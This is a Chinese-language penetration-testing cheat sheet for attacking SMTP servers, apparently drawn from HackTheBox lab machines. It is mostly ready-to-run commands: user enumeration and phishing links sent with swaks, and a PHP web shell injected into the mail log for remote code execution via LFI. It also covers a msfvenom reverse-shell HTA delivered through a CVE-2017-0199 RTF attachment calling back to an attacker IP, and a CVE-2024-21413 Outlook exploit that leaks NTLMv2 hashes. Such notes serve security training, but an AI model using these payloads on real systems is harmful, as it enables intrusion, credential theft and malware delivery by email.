@SMTP（Simple Mail Transfer Protocol） , 用于发送电子邮件的标准协议之一 , 默认端口。

```
nc <IP> 25
```

```
HELO xxx
MAIL FROM: <xx@xx>
RCPT TO: <xx@xx>
```

```
VRFY <USER> 
查看是否存在当前用户
```

![](photos/Pasted%20image%2020231231170531.png)

###### sendEmail （命令行发邮件工具）
```bash
sendEmail -f 发件人邮箱地址 -t 收件人邮箱地址 -s SMTP服务器地址[:端口] -u 邮件主题 -m 邮件正文 -a 附件 [-v (详细输出)]
```

###### swaks  (常用于远程点击 http 链接 / 拿凭据信息)
```bash
swaks --to itsupport@outdated.htb --from "xekoner@gmail.com" --header "Subject: Internal web app" --body "http://10.10.14.11/" --server <IP>
```

```bash
nc -lvvp 80
swaks --to $(cat email | tr '\n' ',' | less) --from "xekoner@gmail.com" --header "Subject: Internal web app" --body "http://10.10.14.11/" --server 10.129.2.28
```

**凭据验证**
```bash
swaks -server mailing.htb --auth LOGIN --auth-user administrator@mailing.htb --auth-password homenetworkingadministrator --quit-after AUTH
```

###### ENUM USERS
- smtp-user-enum
```
perl smtp-user-enum-master/smtp-user-enum.pl -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.55.8
```
	
```
smtp-user-enum -M VRFY/EXPN/RCPT/ -U/u root/user.list -t 192.168.55.101
smtp-user-enum -M EXPN -t 192.168.0.101 -u <?phpsystem('id');?>
```

***
**25+80 组合开放， 80有 LFI ，可以尝试**
SMTP 日志文件位置：
```
../../../../../../../../../var/log/mail
```

SMTP 日志，发送一句话木马:
```
helo root  #标识用户身份
mail from: "root <?php echo shell_exec($_GET['cmd']); ?>"    # 发件人，一句话木马 
rcpt to:root  #收件人
```
访问 ： xxxxxx&cmd=whoami
***

##### RCE Exp **CVE-2017-0199**    >[0x20 Reel (邮件发送rtf文件拿shell,Bloodhound,枚举)](../../0x0B%20HackTheBox%20WP/靶机推荐第五组%2081-120暨内⽹和域渗透学习路径/0x20%20Reel%20(邮件发送rtf文件拿shell,Bloodhound,枚举).md)<

- 建立反向 shell 利用文件
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.39 LPORT=2233 -f hta-psh -o msfv.hta (生成hta文件的reverse shell)
```

- 创建 rtf 文件
https://github.com/bhdresh/CVE-2017-0199
```bash
└─$ python2 cve-2017-0199_toolkit.py -M gen -t RTF -w Invoice.rtf -u http://10.10.14.39/msfv.hta -x 0
```
`-M gen` 生成文档
`-w Invoice.rtf` 输出文件名
`-u http://10.10.14.39/msfv.hta` URL
`-t RTF` 指定创建 rtf 类型文档
`-x 0` 禁用 rtf 混淆

- 生成 Invoice.rtf 后，使用邮件发送：
```bash
sendEmail -f xekOnerR@gmail.com -t nico@megabank.com -s 10.129.228.182:25 -u 'Hello,Sir' -m 'Nothing Here,LOL' -a Invoice.rtf -v
```


##### 发送邮件得到 NTLMv2响应
https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
（需要凭据信息）
```bash
python CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender qwe@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.17\qwe" --subject "QWE"
```




# 提权枚举

[+] Linpeas.sh 中的 `Searching installed mail applications` , `Mails (limit 50)`

如果本机开放了25端口，可以直接 nc 链接 `nc 127.0.0.1 25` 然后等待，查看版本信息，搜索 exp
```bash
www-data@plum:/var/www/html$ nc 127.0.0.1 25
nc 127.0.0.1 25
220 localhost |ESMTP Exim 4.94.2| Sun, 30 Jun 2024 03:21:36 -0400
```

- exim
手工枚举邮件文件路径：
```
/var/spool/exim4/
/var/log/exim4/
/var/mail/
/var/spool/mail/
```